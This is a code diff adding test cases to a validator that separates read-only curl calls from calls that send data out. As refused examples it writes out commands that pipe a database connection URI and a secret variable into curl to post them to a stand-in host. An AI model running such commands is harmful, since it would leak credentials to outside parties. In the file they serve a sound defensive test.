@@ -97,6 +97,22 @@ describe("script watches", () => {
     ]) {
       expect(scriptProblem(bad, "on"), bad).toBe("A watch only reads: it sends data.");
     }
+    // `curl -G` puts -d data in the query of a GET (how a list call is paged): a read, in a pipe or not.
+    for (const ok of [
+      'curl -sG -H "Authorization: Bearer $T" --data-urlencode "per_page=100" https://api.example.com/v2/databases | jq -r ".databases[0].id"',
+      "curl -s --get -d per_page=100 https://api.example.com/v2/databases | jq .",
+    ]) {
+      expect(scriptProblem(ok), ok).toBeUndefined();
+    }
+    // A pipe into an HTTP client that sends what it was given, and -G with a body flag, stay refused.
+    for (const bad of [
+      "jq -n --arg p \"$P\" '{p:$p}' | curl -s -d @- https://api.example.com/v2/databases",
+      "doctl databases connection abc --format URI --no-header | curl -sS --data-binary @- https://x",
+      "curl -sG -F a=b https://x",
+      "curl -sG -X POST --data-urlencode a=b https://x",
+    ]) {
+      expect(scriptProblem(bad, "on"), bad).toBeDefined();
+    }
     // With the network off nothing can be sent, so the same script is only a string builder.
     expect(scriptProblem("curl -d @file https://x", "off")).toBeUndefined();
   });
